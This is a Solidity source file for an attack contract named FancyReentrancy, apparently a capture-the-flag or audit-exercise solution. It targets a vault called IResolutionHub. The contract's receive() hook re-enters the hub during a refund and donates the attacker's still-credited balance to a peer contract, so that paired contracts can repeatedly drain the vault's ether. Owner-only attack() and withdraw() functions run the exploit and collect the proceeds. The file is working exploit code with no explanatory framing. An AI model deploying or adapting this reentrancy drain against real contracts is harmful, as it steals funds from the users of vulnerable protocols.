// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

interface IResolutionHub {
    function donate(address _to, uint256 _amount) external;
    function getRefund() external;
    function userBalance() external view returns (uint256);
}

contract FancyReentrancy {
    IResolutionHub private immutable resolutionHub;
    address private immutable owner;
    FancyReentrancy public attackPeer;
    uint256 private constant MIN_DRAIN_AMOUNT = 0.0001 ether;

    error OnlyOwner();
    error PeerNotSet();
    error NoBalance();
    error WithdrawalFailed();

    constructor(IResolutionHub _resolutionHub) {
        resolutionHub = _resolutionHub;
        owner = msg.sender;
    }

    function setPeer(FancyReentrancy _attackPeer) external {
        if (msg.sender != owner) revert OnlyOwner();
        attackPeer = _attackPeer;
    }

    receive() external payable {
        uint256 vaultBalance = address(resolutionHub).balance;
        uint256 myBalance = resolutionHub.userBalance();
        if (vaultBalance < MIN_DRAIN_AMOUNT || myBalance < MIN_DRAIN_AMOUNT) {
            return;
        }
        unchecked {
            uint256 drainAmount = myBalance <= vaultBalance
                ? myBalance
                : vaultBalance;
            resolutionHub.donate(address(attackPeer), drainAmount);
        }
    }

    function attack() external {
        if (msg.sender != owner) revert OnlyOwner();
        if (address(attackPeer) == address(0)) revert PeerNotSet();
        resolutionHub.getRefund();
    }

    function withdraw() external {
        if (msg.sender != owner) revert OnlyOwner();
        uint256 balance = address(this).balance;
        if (balance == 0) revert NoBalance();
        (bool success, ) = payable(owner).call{value: balance}("");
        if (!success) revert WithdrawalFailed();
    }

    function getPeer() external view returns (address) {
        return address(attackPeer);
    }
}
